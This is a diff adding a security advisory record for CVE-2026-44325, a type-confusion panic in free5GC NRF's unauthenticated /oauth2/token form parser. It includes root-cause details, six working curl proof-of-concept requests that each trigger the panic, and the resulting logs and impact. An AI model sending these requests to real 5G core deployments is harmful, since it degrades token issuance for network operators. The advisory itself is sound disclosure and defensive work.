@@ -1,0 +1,57 @@
+{
+  "id": "GHSA-f8qv-7x5w-qr48",
+  "modified": "2026-05-08T23:02:30.432158Z",
+  "published": "2026-05-08T22:56:03Z",
+  "aliases": [
+    "CVE-2026-44325"
+  ],
+  "summary": "free5GC NRF: type-confusion panic in POST /oauth2/token structured-form parser via Reflect.Set on incompatible types",
+  "details": "### Summary\nfree5GC's NRF root SBI endpoint `POST /oauth2/token` contains a parser-level type-confusion bug family. The handler in `NFs/nrf/internal/sbi/api_accesstoken.go` reflects over `models.NrfAccessTokenAccessTokenReq`, special-cases only plain `string` and `NrfNfManagementNfType` fields, and treats every other field as if it were a single `models.PlmnId`. The parsed `*models.PlmnId` is then assigned with `reflect.Value.Set()` to whichever field name the attacker put in the form body, which panics whenever the destination field's real type is incompatible (slice, different struct, primitive). Gin recovery converts each panic into `HTTP 500`, but the endpoint remains remotely panicable from a single unauthenticated form-encoded request and is repeatedly triggerable across at least 6 confirmed crashing fields.\n\nNote: `/oauth2/token` is unauthenticated by design (it is the OAuth2 token-issuance endpoint). So this is NOT framed as an auth-bypass finding -- it is a parser bug on an intentionally unauthenticated SBI endpoint.\n\n### Details\nValidated against the NRF container in the official Docker compose lab.\n- Source repo tag: `v4.2.1`\n- Running Docker image: `free5gc/nrf:v4.2.1`\n- Docker validation date: 2026-03-22\n- NRF endpoint: `http://10.100.200.3:8000`\n\nRoot cause is in the access-token request parser:\n- `NFs/nrf/internal/sbi/api_accesstoken.go:52`\n- `NFs/nrf/internal/sbi/api_accesstoken.go:87`\n- `NFs/nrf/internal/sbi/api_accesstoken.go:98`\n- `NFs/nrf/internal/sbi/api_accesstoken.go:100`\n- `NFs/nrf/internal/sbi/api_accesstoken.go:112`\n\nThe model definition lives in `free5gc/openapi`:\n- `models/model_nrf_access_token_access_token_req.go:27`\n- `models/model_nrf_access_token_access_token_req.go:29`\n- `models/model_nrf_access_token_access_token_req.go:30`\n- `models/model_nrf_access_token_access_token_req.go:31`\n\nThe parser's effective shape is: parse value as `*models.PlmnId`, then `dstField.Set(reflect.ValueOf(parsedPlmnId))`. Every destination field that is NOT `string` and NOT `NrfNfManagementNfType` falls into this branch, so any time the destination is a slice (`[]models.PlmnId`, `[]models.Snssai`, `[]models.PlmnIdNid`, `[]string`) or a different pointer type (`*models.PlmnIdNid`), the `reflect.Set` call panics with a runtime type-confusion error.\n\nConfirmed crashing fields in this DoS family (all reachable from a single unauthenticated form-encoded POST):\n- `requesterPlmnList` -\u003e panic assigning `*models.PlmnId` to `[]models.PlmnId`\n- `requesterSnssaiList` -\u003e panic assigning `*models.PlmnId` to `[]models.Snssai`\n- `requesterSnpnList` -\u003e panic assigning `*models.PlmnId` to `[]models.PlmnIdNid`\n- `targetSnpn` -\u003e panic assigning `*models.PlmnId` to `*models.PlmnIdNid`\n- `targetSnssaiList` -\u003e panic assigning `*models.PlmnId` to `[]models.Snssai`\n- `targetNsiList` -\u003e panic assigning `*models.PlmnId` to `[]string`\n\n### PoC\nReproduced end-to-end against the running NRF at `http://10.100.200.3:8000`. Each of the following single requests independently crashes the handler.\n\n1. `requesterPlmnList` -\u003e `[]models.PlmnId` mismatch:\n```\ncurl -i -X POST http://10.100.200.3:8000/oauth2/token \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data-urlencode 'requesterPlmnList={\"mcc\":\"208\",\"mnc\":\"93\"}'\n```\n\n2. `requesterSnssaiList` -\u003e `[]models.Snssai` mismatch:\n```\ncurl -i -X POST http://10.100.200.3:8000/oauth2/token \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data-urlencode 'requesterSnssaiList={\"mcc\":\"208\",\"mnc\":\"93\"}'\n```\n\n3. `requesterSnpnList` -\u003e `[]models.PlmnIdNid` mismatch:\n```\ncurl -i -X POST http://10.100.200.3:8000/oauth2/token \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data-urlencode 'requesterSnpnList={\"mcc\":\"208\",\"mnc\":\"93\"}'\n```\n\n4. `targetSnpn` -\u003e `*models.PlmnIdNid` mismatch:\n```\ncurl -i -X POST http://10.100.200.3:8000/oauth2/token \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data-urlencode 'targetSnpn={\"mcc\":\"208\",\"mnc\":\"93\"}'\n```\n\n5. `targetSnssaiList` -\u003e `[]models.Snssai` mismatch:\n```\ncurl -i -X POST http://10.100.200.3:8000/oauth2/token \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data-urlencode 'targetSnssaiList={\"mcc\":\"208\",\"mnc\":\"93\"}'\n```\n\n6. `targetNsiList` -\u003e `[]string` mismatch:\n```\ncurl -i -X POST http://10.100.200.3:8000/oauth2/token \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data-urlencode 'targetNsiList={\"mcc\":\"208\",\"mnc\":\"93\"}'\n```\n\nObserved response (per request, no body returned):\n```\nHTTP/1.1 500 Internal Server Error\nContent-Length: 0\n```\n\nNRF container logs (`docker logs nrf`) confirm the `reflect.Set` type-confusion panic in `HTTPAccessTokenRequest`, with the panic message changing per field type:\n```\n[ERRO][NRF][GIN] panic: reflect.Set: value of type *models.PlmnId is not assignable to type []models.PlmnId\n[ERRO][NRF][GIN] panic: reflect.Set: value of type *models.PlmnId is not assignable to type []models.Snssai\n[ERRO][NRF][GIN] panic: reflect.Set: value of type *models.PlmnId is not assignable to type []models.PlmnIdNid\n[ERRO][NRF][GIN] panic: reflect.Set: value of type *models.PlmnId is not assignable to type *models.PlmnIdNid\n[ERRO][NRF][GIN] panic: reflect.Set: value of type *models.PlmnId is not assignable to type []string\nINFO][NRF][GIN] | 500 | POST | /oauth2/token |\n```\n\n### Impact\nType-confusion panic family (CWE-843) in the form-parser of an unauthenticated, network-reachable, root token-issuance endpoint, with no input validation on field types (CWE-20) and no defensive handling of the resulting panic before reflection (CWE-755).\n\nThis is NOT framed as an auth-bypass finding: `/oauth2/token` is unauthenticated by design. It is also NOT a process-kill DoS: Gin recovery catches each panic and the NRF process keeps running, so legitimate clients can still get tokens between attacker requests.\n\nWhat the bug realistically gives an off-path attacker:\n- A reliable, unauthenticated, repeatable panic primitive on the root token endpoint, reachable from a single form-encoded POST.\n- Per-request CPU + log-write cost that is materially higher than a normal validation reject (`400`) would have been, because the panic generates a stack trace each time.\n- A class of at least 6 attacker-selectable form keys that all crash via the same root cause, so partial fixes that harden one field do not close the family.\n- Sustained-attack potential: under flood, the panic-amplification can degrade NRF token issuance (more expensive than `400` validation) and pollute logs / rotate out useful diagnostic history.\n\nNo Confidentiality impact (`HTTP 500` with empty body, no stack trace returned to the caller). No Integrity impact (panic happens before any state change). Availability impact is limited to per-request degradation under sustained attack; a single request does not deny service to other clients.\n\nAffected: free5gc v4.2.1.\n\nUpstream issue: https://github.com/free5gc/free5gc/issues/918\nUpstream fix: https://github.com/free5gc/nrf/pull/83",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/free5gc/nrf",
+        "purl": "pkg:golang/github.com/free5gc/nrf"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.4.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-f8qv-7x5w-qr48/GHSA-f8qv-7x5w-qr48.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/free5gc/security/advisories/GHSA-f8qv-7x5w-qr48"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/free5gc/issues/918"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/nrf/pull/83"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/nrf/commit/f7bc77daa7425506af7569f2e61c2a210f5a0423"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/free5gc/free5gc"
+    }
+  ]
+}
